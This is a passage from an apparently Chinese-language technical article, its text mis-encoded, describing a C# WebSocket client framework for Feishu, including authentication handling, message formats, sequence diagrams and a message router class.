            <span class="hljs-keyword">var</span> errorArgs = <span class="hljs-keyword">new</span> WebSocketErrorEventArgs
            {
                Exception = ex,
                ErrorMessage = <span class="hljs-string">$"å¤„ç†è®¤è¯å“åº”æ—¶å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">{ex.Message}</span>"</span>,
                ErrorType = ex.GetType().Name,
                IsAuthError = <span class="hljs-literal">true</span>
            };
            
            AuthenticationFailed?.Invoke(<span class="hljs-keyword">this</span>, errorArgs);
        }
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> é‡ç½®è®¤è¯çŠ¶æ€</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ResetAuthentication</span>()</span>
    {
        _isAuthenticated = <span class="hljs-literal">false</span>;
        _logger.LogDebug(<span class="hljs-string">"å·²é‡ç½®è®¤è¯çŠ¶æ€"</span>);
    }
}
</code></pre>
<p><strong>è®¤è¯æµç¨‹è¯¦ç»†æœºåˆ¶</strong></p>
<p>è®¤è¯ç®¡ç†å™¨çš„å®ç°éµå¾ªå®‰å…¨æ€§å’Œå¯é æ€§åŸåˆ™ï¼Œç¡®ä¿è®¤è¯è¿‡ç¨‹çš„å®‰å…¨å’Œç¨³å®šï¼š</p>
<ol>
<li>
<p><strong>å‚æ•°éªŒè¯æœºåˆ¶</strong>ï¼šåœ¨è®¤è¯å¼€å§‹å‰è¿›è¡Œä¸¥æ ¼çš„å‚æ•°éªŒè¯ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>AppAccessTokençš„éç©ºæ£€æŸ¥</li>
<li>ä»¤ç‰Œæ ¼å¼éªŒè¯</li>
<li>æƒé™èŒƒå›´ç¡®è®¤</li>
</ul>
</li>
<li>
<p><strong>æ¶ˆæ¯æ„å»ºç­–ç•¥</strong>ï¼šé‡‡ç”¨æ ‡å‡†åŒ–çš„è®¤è¯æ¶ˆæ¯æ ¼å¼ï¼ŒåŒ…å«ï¼š</p>
<ul>
<li>æ—¶é—´æˆ³ï¼ˆé˜²é‡æ”¾æ”»å‡»ï¼‰</li>
<li>åº”ç”¨è®¿é—®ä»¤ç‰Œ</li>
<li>åè®®ç‰ˆæœ¬ä¿¡æ¯</li>
</ul>
</li>
<li>
<p><strong>çŠ¶æ€ç®¡ç†</strong>ï¼šé€šè¿‡å†…éƒ¨çŠ¶æ€æ ‡å¿—ç¡®ä¿è®¤è¯çŠ¶æ€çš„ä¸€è‡´æ€§ï¼š</p>
<ul>
<li><code>_isAuthenticated</code>æ ‡å¿—æ§åˆ¶è®¤è¯çŠ¶æ€</li>
<li>çŠ¶æ€å˜åŒ–æ—¶è§¦å‘ç›¸åº”äº‹ä»¶</li>
<li>æ”¯æŒçŠ¶æ€æŸ¥è¯¢å’Œé‡ç½®</li>
</ul>
</li>
<li>
<p><strong>å¼‚å¸¸å¤„ç†æœºåˆ¶</strong>ï¼šå®Œå–„çš„é”™è¯¯å¤„ç†å’Œæ¢å¤ç­–ç•¥ï¼š</p>
<ul>
<li>ç½‘ç»œå¼‚å¸¸å¤„ç†</li>
<li>è®¤è¯å¤±è´¥å¤„ç†</li>
<li>è¶…æ—¶å’Œå–æ¶ˆæ”¯æŒ</li>
</ul>
</li>
</ol>
<p><strong>è®¤è¯äº¤äº’æ—¶åºå›¾</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant App as åº”ç”¨ç¨‹åº
    participant Auth as è®¤è¯ç®¡ç†å™¨
    participant WS as WebSocket
    participant Server as é£ä¹¦æœåŠ¡å™¨
    participant Logger as æ—¥å¿—ç³»ç»Ÿ
    
    App-&gt;&gt;Auth: AuthenticateAsync(appAccessToken)
    Auth-&gt;&gt;Auth: éªŒè¯ä»¤ç‰Œå‚æ•°
    Auth-&gt;&gt;Auth: æ„å»ºè®¤è¯æ¶ˆæ¯
    
    alt å‚æ•°æœ‰æ•ˆ
        Auth-&gt;&gt;Auth: åºåˆ—åŒ–JSONæ¶ˆæ¯
        Auth-&gt;&gt;Logger: è®°å½•è®¤è¯å¼€å§‹
        Auth-&gt;&gt;WS: å‘é€è®¤è¯æ¶ˆæ¯(å›è°ƒ)
        WS-&gt;&gt;Server: å‘é€è®¤è¯è¯·æ±‚
        Auth-&gt;&gt;Logger: è®°å½•æ¶ˆæ¯å·²å‘é€
        
        alt è®¤è¯æˆåŠŸ
            Server--&gt;&gt;WS: è®¤è¯æˆåŠŸå“åº”
            WS--&gt;&gt;Auth: HandleAuthResponse(å“åº”)
            Auth-&gt;&gt;Auth: è§£æå“åº”æ¶ˆæ¯
            Auth-&gt;&gt;Auth: éªŒè¯å“åº”çŠ¶æ€
            Auth-&gt;&gt;Auth: æ›´æ–°è®¤è¯çŠ¶æ€
            Auth-&gt;&gt;Logger: è®°å½•è®¤è¯æˆåŠŸ
            Auth-&gt;&gt;App: è§¦å‘Authenticatedäº‹ä»¶
        else è®¤è¯å¤±è´¥
            Server--&gt;&gt;WS: è®¤è¯å¤±è´¥å“åº”
            WS--&gt;&gt;Auth: HandleAuthResponse(å“åº”)
            Auth-&gt;&gt;Auth: è§£æé”™è¯¯ä¿¡æ¯
            Auth-&gt;&gt;Auth: æ›´æ–°å¤±è´¥çŠ¶æ€
            Auth-&gt;&gt;Logger: è®°å½•è®¤è¯å¤±è´¥
            Auth-&gt;&gt;App: è§¦å‘AuthenticationFailedäº‹ä»¶
        end
    else å‚æ•°æ— æ•ˆ
        Auth-&gt;&gt;Logger: è®°å½•å‚æ•°é”™è¯¯
        Auth-&gt;&gt;App: æŠ›å‡ºArgumentException
    end
</code></pre>
<p><strong>æ ¸å¿ƒè®¤è¯æ¶ˆæ¯æ ¼å¼</strong></p>
<p>é£ä¹¦WebSocketè®¤è¯ä½¿ç”¨æ ‡å‡†åŒ–çš„JSONæ¶ˆæ¯æ ¼å¼ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"timestamp"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1703920800</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"app_access_token"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"your_app_access_token_here"</span>
    <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>å“åº”æ¶ˆæ¯æ ¼å¼</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"msg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"success"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"session_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"websocket_session_id"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"expires_in"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3600</span>
    <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>è®¤è¯å®‰å…¨è€ƒè™‘</strong></p>
<ol>
<li>
<p><strong>ä»¤ç‰Œå®‰å…¨</strong>ï¼š</p>
<ul>
<li>AppAccessTokenä¸åº”åœ¨ä»£ç ä¸­ç¡¬ç¼–ç </li>
<li>æ”¯æŒä»¤ç‰Œè‡ªåŠ¨åˆ·æ–°æœºåˆ¶</li>
<li>ä»¤ç‰Œå­˜å‚¨å’Œä¼ è¾“åŠ å¯†</li>
</ul>
</li>
<li>
<p><strong>é˜²é‡æ”¾æ”»å‡»</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨æ—¶é—´æˆ³éªŒè¯æ¶ˆæ¯æ–°é²œåº¦</li>
<li>æ”¯æŒæ¶ˆæ¯ç­¾åæœºåˆ¶</li>
<li>ä¼šè¯å”¯ä¸€æ€§æ ‡è¯†</li>
</ul>
</li>
<li>
<p><strong>é”™è¯¯å¤„ç†</strong>ï¼š</p>
<ul>
<li>æ•æ„Ÿä¿¡æ¯ä¸è®°å½•åˆ°æ—¥å¿—</li>
<li>è®¤è¯å¤±è´¥ä¸æš´éœ²å…·ä½“é”™è¯¯</li>
<li>æ”¯æŒä¼˜é›…é™çº§å¤„ç†</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">3.3 æ¶ˆæ¯è·¯ç”±å™¨ï¼ˆMessageRouterï¼‰</h3>
<p>æ¶ˆæ¯è·¯ç”±å™¨æ˜¯é£ä¹¦WebSocketæ¡†æ¶çš„æ¶ˆæ¯åˆ†å‘æ ¸å¿ƒï¼Œè´Ÿè´£è¯†åˆ«æ¶ˆæ¯ç±»å‹ã€ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¹¶å°†æ¶ˆæ¯ç²¾ç¡®è·¯ç”±åˆ°å¯¹åº”çš„å¤„ç†å™¨ã€‚å®ƒé‡‡ç”¨ç­–ç•¥æ¨¡å¼å’Œè´£ä»»é“¾æ¨¡å¼çš„ç»„åˆï¼Œç¡®ä¿æ¶ˆæ¯å¤„ç†çš„é«˜æ•ˆæ€§å’Œå¯æ‰©å±•æ€§ã€‚</p>
<p><strong>æ¶ˆæ¯è·¯ç”±æ¶æ„</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[WebSocketæ¶ˆæ¯] --&gt; B[æ¶ˆæ¯è·¯ç”±å™¨]
    B --&gt; C[æ¶ˆæ¯éªŒè¯]
    C --&gt; D[ç‰ˆæœ¬æ£€æµ‹]
    D --&gt; E{æ¶ˆæ¯ç‰ˆæœ¬}
    
    E --&gt;|v1.0| F[V1å¤„ç†å™¨]
    E --&gt;|v2.0| G[V2å¤„ç†å™¨]
    E --&gt;|æœªçŸ¥| H[é»˜è®¤å¤„ç†å™¨]
    
    F --&gt; I[ä¸šåŠ¡å¤„ç†å™¨1]
    F --&gt; J[ä¸šåŠ¡å¤„ç†å™¨2]
    G --&gt; K[ä¸šåŠ¡å¤„ç†å™¨3]
    G --&gt; L[ä¸šåŠ¡å¤„ç†å™¨4]
    H --&gt; M[é”™è¯¯å¤„ç†]
    
    I --&gt; N[å¤„ç†ç»“æœ]
    J --&gt; N
    K --&gt; N
    L --&gt; N
    M --&gt; O[é”™è¯¯å“åº”]
    
    style B fill:#e1f5fe
    style D fill:#fff3e0
    style E fill:#f3e5f5
</code></pre>
<p><strong>æ¶ˆæ¯ç±»å‹è¯†åˆ«</strong></p>
<p>æ¶ˆæ¯è·¯ç”±å™¨é¦–å…ˆéœ€è¦å¯¹æ¥æ”¶åˆ°çš„æ¶ˆæ¯è¿›è¡Œç±»å‹å’Œç‰ˆæœ¬è¯†åˆ«ï¼Œä»¥ç¡®å®šåˆé€‚çš„å¤„ç†ç­–ç•¥ã€‚é£ä¹¦WebSocketæ”¯æŒå¤šç§æ¶ˆæ¯æ ¼å¼ï¼ŒåŒ…æ‹¬v1.0å’Œv2.0åè®®ç‰ˆæœ¬ã€‚</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> æ¶ˆæ¯å¤„ç†å™¨æ¥å£</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title">IMessageHandler</span>
{
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ˜¯å¦å¯ä»¥å¤„ç†æŒ‡å®šç±»å‹çš„æ¶ˆæ¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="messageType"&gt;</span>æ¶ˆæ¯ç±»å‹<span class="hljs-doctag">&lt;/param&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;returns&gt;</span>æ˜¯å¦å¯ä»¥å¤„ç†<span class="hljs-doctag">&lt;/returns&gt;</span></span>
    <span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">CanHandle</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> messageType</span>)</span>;

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¤„ç†æ¶ˆæ¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="message"&gt;</span>æ¶ˆæ¯å†…å®¹<span class="hljs-doctag">&lt;/param&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="cancellationToken"&gt;</span>å–æ¶ˆä»¤ç‰Œ<span class="hljs-doctag">&lt;/param&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;returns&gt;</span>å¤„ç†ä»»åŠ¡<span class="hljs-doctag">&lt;/returns&gt;</span></span>
    <span class="hljs-function">Task <span class="hljs-title">HandleAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>;
}

<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> æ¶ˆæ¯è·¯ç”±å™¨ - è´Ÿè´£å°†æ¶ˆæ¯åˆ†å‘ç»™åˆé€‚çš„å¤„ç†å™¨</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">MessageRouter</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;MessageRouter&gt; _logger;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> List&lt;IMessageHandler&gt; _handlers;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> FeishuWebSocketOptions _options;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MessageRouter</span>(<span class="hljs-params">ILogger&lt;MessageRouter&gt; logger, FeishuWebSocketOptions options</span>)</span>
    {
        _logger = logger ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(logger));
        _handlers = <span class="hljs-keyword">new</span> List&lt;IMessageHandler&gt;();
        _options = options;
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ³¨å†Œæ¶ˆæ¯å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RegisterHandler</span>(<span class="hljs-params">IMessageHandler handler</span>)</span>
    {
        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(handler));

        _handlers.Add(handler);
        _logger.LogDebug(<span class="hljs-string">"å·²æ³¨å†Œæ¶ˆæ¯å¤„ç†å™¨: {HandlerType}"</span>, handler.GetType().Name);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ç§»é™¤æ¶ˆæ¯å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">UnregisterHandler</span>(<span class="hljs-params">IMessageHandler handler</span>)</span>
    {
        <span class="hljs-keyword">var</span> removed = _handlers.Remove(handler);
        <span class="hljs-keyword">if</span> (removed)
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
            {
                _logger.LogDebug(<span class="hljs-string">"å·²ç§»é™¤æ¶ˆæ¯å¤„ç†å™¨: {HandlerType}"</span>, handler.GetType().Name);
            }
        }
        <span class="hljs-keyword">return</span> removed;
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> è·¯ç”±æ¶ˆæ¯åˆ°åˆé€‚çš„å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">RouteMessageAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(message))
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
            {
                _logger.LogWarning(<span class="hljs-string">"æ”¶åˆ°ç©ºæ¶ˆæ¯ï¼Œè·³è¿‡è·¯ç”±"</span>);
            }
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-keyword">await</span> RouteMessageInternalAsync(message, <span class="hljs-string">"Text"</span>, cancellationToken);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> è·¯ç”±ä»äºŒè¿›åˆ¶æ¶ˆæ¯è½¬æ¢è€Œæ¥çš„JSONæ¶ˆæ¯åˆ°åˆé€‚çš„å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">RouteBinaryMessageAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> jsonContent, <span class="hljs-built_in">string</span> messageType, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(jsonContent))
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
            {
                _logger.LogWarning(<span class="hljs-string">"æ”¶åˆ°ç©ºçš„äºŒè¿›åˆ¶è½¬æ¢æ¶ˆæ¯ï¼Œè·³è¿‡è·¯ç”±"</span>);
            }
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-keyword">await</span> RouteMessageInternalAsync(jsonContent, <span class="hljs-string">$"Binary_<span class="hljs-subst">{messageType}</span>"</span>, cancellationToken);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æå–æ¶ˆæ¯ç±»å‹</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> <span class="hljs-title">ExtractMessageType</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message</span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">using</span> <span class="hljs-keyword">var</span> jsonDoc = System.Text.Json.JsonDocument.Parse(message);
            <span class="hljs-keyword">var</span> root = jsonDoc.RootElement;

            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦ä¸ºv2.0ç‰ˆæœ¬</span>
            <span class="hljs-keyword">if</span> (root.TryGetProperty(<span class="hljs-string">"schema"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> schemaElement) &amp;&amp;
                schemaElement.GetString() == <span class="hljs-string">"2.0"</span>)
            {
                <span class="hljs-keyword">if</span> (root.TryGetProperty(<span class="hljs-string">"header"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> headerElement) &amp;&amp;
                    headerElement.TryGetProperty(<span class="hljs-string">"event_type"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> eventTypeElement))
                {
                    <span class="hljs-keyword">return</span> <span class="hljs-string">"event"</span>; <span class="hljs-comment">// v2.0ä¸»è¦æ˜¯äº‹ä»¶æ¶ˆæ¯</span>
                }
            }

            <span class="hljs-comment">// v1.0ç‰ˆæœ¬å¤„ç†</span>
            <span class="hljs-keyword">if</span> (root.TryGetProperty(<span class="hljs-string">"type"</span>, <span class="hljs-keyword">out</span> <span class="hljs-keyword">var</span> typeElement))
            {
                <span class="hljs-keyword">return</span> typeElement.GetString()?.ToLowerInvariant() ?? <span class="hljs-built_in">string</span>.Empty;
            }

            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;
        }
        <span class="hljs-keyword">catch</span> (System.Text.Json.JsonException ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"è§£ææ¶ˆæ¯JSONå¤±è´¥: {Message}"</span>, message);
            <span class="hljs-keyword">return</span> <span class="hljs-built_in">string</span>.Empty;
        }
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å†…éƒ¨æ¶ˆæ¯è·¯ç”±å¤„ç†</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">RouteMessageInternalAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, <span class="hljs-built_in">string</span> sourceType, CancellationToken cancellationToken</span>)</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-comment">// æå–æ¶ˆæ¯ç±»å‹</span>
            <span class="hljs-keyword">var</span> messageType = ExtractMessageType(message);
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(messageType))
            {
                _logger.LogWarning(<span class="hljs-string">"æ— æ³•æå–æ¶ˆæ¯ç±»å‹ (æ¥æº: {SourceType}): {Message}"</span>, sourceType, message);
                <span class="hljs-keyword">return</span>;
            }

            <span class="hljs-comment">// æŸ¥æ‰¾èƒ½å¤„ç†è¯¥æ¶ˆæ¯ç±»å‹çš„å¤„ç†å™¨</span>
            <span class="hljs-keyword">var</span> handler = _handlers.FirstOrDefault(h =&gt; h.CanHandle(messageType));
            <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>)
            {
                _logger.LogWarning(<span class="hljs-string">"æœªæ‰¾åˆ°èƒ½å¤„ç†æ¶ˆæ¯ç±»å‹ {MessageType} çš„å¤„ç†å™¨ (æ¥æº: {SourceType})"</span>, messageType, sourceType);
                <span class="hljs-keyword">return</span>;
            }
            _logger.LogDebug(<span class="hljs-string">"å°†æ¶ˆæ¯è·¯ç”±åˆ°å¤„ç†å™¨: {HandlerType} (æ¥æº: {SourceType}, æ¶ˆæ¯ç±»å‹: {MessageType})"</span>,
                    handler.GetType().Name, sourceType, messageType);
            <span class="hljs-keyword">await</span> handler.HandleAsync(message, cancellationToken);
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"è·¯ç”±æ¶ˆæ¯æ—¶å‘ç”Ÿé”™è¯¯ (æ¥æº: {SourceType}): {Message}"</span>, sourceType, message);
        }
    }
}
</code></pre>
<p><strong>æ¶ˆæ¯è·¯ç”±æµç¨‹è¯¦è§£</strong></p>
<p>æ¶ˆæ¯è·¯ç”±å™¨çš„æ ¸å¿ƒèŒè´£æ˜¯æ ¹æ®æ¶ˆæ¯ç‰¹å¾è¿›è¡Œæ™ºèƒ½åˆ†å‘ï¼Œå…¶å·¥ä½œæµç¨‹åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªå…³é”®æ­¥éª¤ï¼š</p>
<ol>
<li><strong>æ¶ˆæ¯é¢„éªŒè¯</strong>ï¼šæ£€æŸ¥æ¶ˆæ¯çš„åŸºæœ¬æ ¼å¼å’Œæœ‰æ•ˆæ€§</li>
<li><strong>ç‰ˆæœ¬è¯†åˆ«</strong>ï¼šé€šè¿‡schemaå­—æ®µæˆ–typeå­—æ®µç¡®å®šæ¶ˆæ¯ç‰ˆæœ¬</li>
<li><strong>ç±»å‹åŒ¹é…</strong>ï¼šæ ¹æ®æ¶ˆæ¯å†…å®¹æ‰¾åˆ°å¯¹åº”çš„å¤„ç†å™¨</li>
<li><strong>å¼‚æ­¥åˆ†å‘</strong>ï¼šå°†æ¶ˆæ¯å¼‚æ­¥å‘é€ç»™åŒ¹é…çš„å¤„ç†å™¨</li>
<li><strong>ç»“æœèšåˆ</strong>ï¼šæ”¶é›†å¤„ç†ç»“æœå¹¶è¿›è¡Œåç»­å¤„ç†</li>
</ol>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant WS as WebSocket
    participant Router as æ¶ˆæ¯è·¯ç”±å™¨
    participant Validator as æ¶ˆæ¯éªŒè¯å™¨
    participant Detector as ç‰ˆæœ¬æ£€æµ‹å™¨
    participant Registry as å¤„ç†å™¨æ³¨å†Œè¡¨
    participant Handler as æ¶ˆæ¯å¤„ç†å™¨
    participant Logger as æ—¥å¿—ç³»ç»Ÿ
    
    WS-&gt;&gt;Router: RouteMessageAsync(message)
    Router-&gt;&gt;Router: æ£€æŸ¥æ¶ˆæ¯æœ‰æ•ˆæ€§
    
    alt æ¶ˆæ¯æœ‰æ•ˆ
        Router-&gt;&gt;Detector: DetectMessageVersion(message)
        Detector-&gt;&gt;Detector: è§£æJSONç»“æ„
        Detector-&gt;&gt;Detector: æ£€æŸ¥schemaå­—æ®µ
        Detector-&gt;&gt;Detector: æ£€æŸ¥typeå­—æ®µ
        
        alt v2.0æ ¼å¼
            Detector--&gt;&gt;Router: è¿”å›v2.0ä¿¡æ¯
        else v1.0æ ¼å¼
            Detector--&gt;&gt;Router: è¿”å›v1.0ä¿¡æ¯
        else æœªçŸ¥æ ¼å¼
            Detector--&gt;&gt;Router: è¿”å›unknown
        end
        
        Router-&gt;&gt;Registry: æŸ¥æ‰¾åŒ¹é…å¤„ç†å™¨
        Registry-&gt;&gt;Registry: éå†å¤„ç†å™¨åˆ—è¡¨
        Registry-&gt;&gt;Registry: åŒ¹é…å¤„ç†æ¡ä»¶
        
        alt æ‰¾åˆ°å¤„ç†å™¨
            Registry--&gt;&gt;Router: è¿”å›åŒ¹é…å¤„ç†å™¨
            Router-&gt;&gt;Handler: å¤„ç†æ¶ˆæ¯(å¼‚æ­¥)
            Handler-&gt;&gt;Handler: æ‰§è¡Œä¸šåŠ¡é€»è¾‘
            Handler--&gt;&gt;Router: è¿”å›å¤„ç†ç»“æœ
            Router-&gt;&gt;Logger: è®°å½•å¤„ç†æˆåŠŸ
        else æœªæ‰¾åˆ°å¤„ç†å™¨
            Registry--&gt;&gt;Router: æ— åŒ¹é…å¤„ç†å™¨
            Router-&gt;&gt;Logger: è®°å½•æœªæ‰¾åˆ°å¤„ç†å™¨
        end
    else æ¶ˆæ¯æ— æ•ˆ
        Router-&gt;&gt;Logger: è®°å½•ç©ºæ¶ˆæ¯è­¦å‘Š
    end
</code></pre>
<p><strong>è·¯ç”±ç­–ç•¥è®¾è®¡</strong></p>
<p>æ¶ˆæ¯è·¯ç”±å™¨é‡‡ç”¨å¤šç»´åº¦åŒ¹é…ç­–ç•¥ï¼Œç¡®ä¿æ¶ˆæ¯èƒ½å¤Ÿç²¾ç¡®è·¯ç”±ï¼š</p>
<ol>
<li>
<p><strong>åŸºäºç‰ˆæœ¬çš„åŒ¹é…</strong>ï¼š</p>
<ul>
<li>v1.0åè®®ï¼šé€šè¿‡<code>type</code>å­—æ®µè¯†åˆ«æ¶ˆæ¯ç±»å‹</li>
<li>v2.0åè®®ï¼šé€šè¿‡<code>schema</code>å­—æ®µç¡®è®¤ç‰ˆæœ¬</li>
<li>å‘åå…¼å®¹ï¼šæ”¯æŒæ—§ç‰ˆæœ¬æ¶ˆæ¯æ ¼å¼</li>
</ul>
</li>
<li>
<p><strong>åŸºäºç±»å‹çš„åŒ¹é…</strong>ï¼š</p>
<ul>
<li>äº‹ä»¶æ¶ˆæ¯ï¼š<code>event</code>ç±»å‹ï¼Œå¦‚æ¶ˆæ¯æ¥æ”¶ã€çŠ¶æ€å˜æ›´</li>
<li>å“åº”æ¶ˆæ¯ï¼š<code>response</code>ç±»å‹ï¼Œå¦‚è®¤è¯å“åº”ã€æ“ä½œç»“æœ</li>
